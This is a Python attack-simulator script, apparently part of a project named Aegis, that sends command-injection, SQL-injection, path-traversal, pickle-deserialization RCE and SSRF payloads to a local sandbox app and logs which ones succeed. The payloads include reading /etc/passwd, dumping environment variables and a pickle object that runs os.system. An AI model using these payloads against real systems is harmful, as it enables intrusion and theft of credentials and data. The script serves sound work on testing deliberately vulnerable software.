import base64
import json
import os
import pickle
import sys
import platform
import argparse
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote

import requests

TARGET = "http://localhost:8001"
TARGET_LOOPBACK = "http://127.0.0.1:8001"
LOG_FILE = Path(__file__).resolve().parents[1] / "data" / "logs" / "attack_results.json"

# ── Command injection (/execute) — OS-specific payload sets ──────────────

WINDOWS_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("dir_listing", "dir src"),
    ("whoami", "whoami"),
    ("ipconfig", "ipconfig"),
    ("read_file", "type C:\\Windows\\win.ini"),
    ("chain_exec", "echo start && dir && echo end"),
    ("ping_test", "ping -n 1 127.0.0.1"),
    ("recursive_dir", "dir /s /b src\\sandbox_target"),
]

LINUX_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("ls_listing", "ls -la src/"),
    ("whoami", "whoami"),
    ("ifconfig", "ifconfig 2>/dev/null || ip a"),
    ("read_file", "cat /etc/passwd 2>/dev/null || cat /etc/hostname"),
    ("chain_exec", "echo start && ls && echo end"),
    ("ping_test", "ping -c 1 127.0.0.1"),
    ("env_dump", "env 2>/dev/null || printenv"),
]

IOS_PAYLOADS = [
    ("basic_echo", "echo AEGIS_BREACH_OK"),
    ("uname", "uname -a"),
    ("ios_version", "sw_vers 2>/dev/null || sw_vers -productVersion 2>/dev/null"),
    ("disk_usage", "df -h /private/var"),
    ("plist_check", "plutil -lint /dev/null 2>&1"),
    ("sandbox_paths", "ls -la /var/mobile/Containers/Data/ 2>/dev/null"),
    ("network_probe", "ifconfig lo0 2>/dev/null || networksetup -listallnetworkservices 2>/dev/null"),
    ("sysctl_probe", "sysctl kern.version kern.ostype 2>/dev/null"),
]

PAYLOAD_MAP = {
    "windows": WINDOWS_PAYLOADS,
    "linux": LINUX_PAYLOADS,
    "ios": IOS_PAYLOADS,
}


def classify_command_injection(name: str, data: dict) -> bool:
    output = data.get("output", "") or ""
    if not output.strip():
        return False
    indicators = ["AEGIS_BREACH_OK", "Volume in drive", "Directory of", "uid=", "gid=",
                  "Windows IP", "IPv4 Address", "127.0.0.1", "win.ini", "[fonts]",
                  "src\\sandbox_target", "src/sandbox_target", "admin", "user",
                  "Darwin", "kern.version", "ProductVersion", "/private/var", "Mobile"]
    return any(i in output for i in indicators)


# ── SQL injection (/search) ───────────────────────────────────────────────

SQLI_PAYLOADS = [
    ("benign_lookup", "alice"),
    ("benign_miss", "nonexistent_user"),
    ("exploit_or_tautology", "nonexistent' OR '1'='1' --"),
    ("exploit_union_select", "nonexistent' UNION SELECT 1,'hacked','root' --"),
]


def classify_sql_injection(name: str, data: dict) -> bool:
    results = data.get("results", [])
    # "benign_miss" searches for a name that doesn't exist — 0 rows is correct.
    # An exploit payload returning rows despite an intentionally-wrong name
    # means the WHERE clause was bypassed.
    return name.startswith("exploit_") and len(results) > 0


# ── Path traversal (/download) ────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    ("benign_report", "q3_summary.txt"),
    # One "../" escapes reports/ into sandbox_target/ itself, reading the
    # live app's own source — a source-disclosure demo that works whether
    # the app is running from the repo directly or from harness.py's
    # isolated temp-dir copy (both preserve reports/'s immediate parent).
    ("exploit_traverse_source", "../app.py"),
    ("exploit_traverse_harness", "../harness.py"),
]


def classify_path_traversal(name: str, data: dict) -> bool:
    content = data.get("content", "") or ""
    return name.startswith("exploit_") and data.get("error") is None and bool(content.strip())


# ── Insecure deserialization (/session) ───────────────────────────────────

class _EchoMarker:
    """Standard pickle __reduce__ RCE demo: unpickling this object runs a
    harmless echo command, proving arbitrary-code-execution via pickle.loads()
    on attacker-controlled bytes. Used only against our own sandbox."""

    def __reduce__(self):
        return (os.system, ("echo AEGIS_BREACH_OK",))


def build_session_payloads() -> list[tuple[str, str]]:
    exploit_token = base64.b64encode(pickle.dumps(_EchoMarker())).decode()
    benign_token = base64.b64encode(json.dumps({"user": "alice"}).encode()).decode()
    return [
        ("benign_session", benign_token),
        ("exploit_pickle_rce", exploit_token),
    ]


def classify_deserialization(name: str, data: dict) -> bool:
    return name.startswith("exploit_") and data.get("error") is None


# ── SSRF (/webhook) ────────────────────────────────────────────────────────

def build_webhook_payloads() -> list[tuple[str, str]]:
    return [
        ("benign_self_ping", f"{TARGET_LOOPBACK}/ping"),      # 127.0.0.1 — in ALLOWED_WEBHOOK_HOSTS
        ("exploit_hostname_bypass", f"{TARGET}/ping"),        # localhost — not in allowlist
    ]


def classify_ssrf(name: str, data: dict) -> bool:
    return name.startswith("exploit_") and data.get("status") == 200


# ── Firing + logging ───────────────────────────────────────────────────────

def log_result(entry: dict):
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    results = []
    if LOG_FILE.exists():
        results = json.loads(LOG_FILE.read_text())
    results.append(entry)
    LOG_FILE.write_text(json.dumps(results, indent=2))
    sys.stdout.write(f"  -> [{entry['endpoint']}] {entry['payload'][:50]}... "
                     f"{'EXPLOITABLE' if entry['exploitable'] else 'BLOCKED'}\n")


def fire(endpoint: str, param: str, name: str, payload: str, classify) -> None:
    encoded = quote(payload)
    url = f"{TARGET}{endpoint}?{param}={encoded}"
    try:
        resp = requests.get(url, timeout=10)
        data = resp.json()
        exploitable = classify(name, data)
        response_summary = {k: v for k, v in data.items() if k != "content"}
        if "content" in data:
            response_summary["content_preview"] = str(data.get("content", ""))[:200]
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            "endpoint": endpoint,
            "payload_name": name,
            "payload": payload,
            "response": response_summary,
            "status_code": resp.status_code,
            "exploitable": exploitable,
        }
    except Exception as e:
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            "endpoint": endpoint,
            "payload_name": name,
            "payload": payload,
            "response": {"error": f"[REQUEST FAILED] {e}"},
            "status_code": 0,
            "exploitable": False,
        }
    log_result(entry)


def main():
    parser = argparse.ArgumentParser(description="Aegis Attack Simulator")
    parser.add_argument(
        "--target-os", "-os",
        choices=["auto", "windows", "linux", "ios"],
        default="auto",
        help="Target OS for command-injection payload selection (default: auto-detect)",
    )
    parser.add_argument(
        "--vuln", "-v",
        choices=["all", "command_injection", "sql_injection", "path_traversal",
                 "deserialization", "ssrf"],
        default="all",
        help="Which vulnerability class to attack (default: all)",
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=8001,
        help="Sandbox port (default: 8001)",
    )
    args = parser.parse_args()

    if args.target_os == "auto":
        detected = platform.system().lower()
        target_os = detected if detected in PAYLOAD_MAP else "linux"
    else:
        target_os = args.target_os

    global TARGET, TARGET_LOOPBACK
    TARGET = f"http://localhost:{args.port}"
    TARGET_LOOPBACK = f"http://127.0.0.1:{args.port}"

    print(f"[*] Aegis Attack Simulator — Target: {TARGET}")

    try:
        requests.get(f"{TARGET}/ping", timeout=3)
    except requests.ConnectionError:
        print("[!] Sandbox not reachable. Start the server first:")
        print("    uvicorn src.sandbox_target.app:app --port 8001")
        sys.exit(1)

    run_all = args.vuln == "all"

    if run_all or args.vuln == "command_injection":
        payloads = PAYLOAD_MAP[target_os]
        print(f"\n[*] /execute — command injection — Target OS: {target_os} "
              f"({len(payloads)} payloads)")
        for name, payload in payloads:
            fire("/execute", "cmd", name, payload, classify_command_injection)

    if run_all or args.vuln == "sql_injection":
        print(f"\n[*] /search — SQL injection ({len(SQLI_PAYLOADS)} payloads)")
        for name, payload in SQLI_PAYLOADS:
            fire("/search", "name", name, payload, classify_sql_injection)

    if run_all or args.vuln == "path_traversal":
        print(f"\n[*] /download — path traversal ({len(PATH_TRAVERSAL_PAYLOADS)} payloads)")
        for name, payload in PATH_TRAVERSAL_PAYLOADS:
            fire("/download", "file", name, payload, classify_path_traversal)

    if run_all or args.vuln == "deserialization":
        session_payloads = build_session_payloads()
        print(f"\n[*] /session — insecure deserialization ({len(session_payloads)} payloads)")
        for name, payload in session_payloads:
            fire("/session", "token", name, payload, classify_deserialization)

    if run_all or args.vuln == "ssrf":
        webhook_payloads = build_webhook_payloads()
        print(f"\n[*] /webhook — SSRF ({len(webhook_payloads)} payloads)")
        for name, payload in webhook_payloads:
            fire("/webhook", "url", name, payload, classify_ssrf)

    print(f"\n[*] Results written to {LOG_FILE}")
    all_results = json.loads(LOG_FILE.read_text())
    exploitable_count = sum(1 for e in all_results if e.get("exploitable"))
    print(f"[*] {exploitable_count}/{len(all_results)} logged payloads confirmed exploitable "
          f"(cumulative across all runs — delete data/logs/attack_results.json to reset)")


if __name__ == "__main__":
    main()
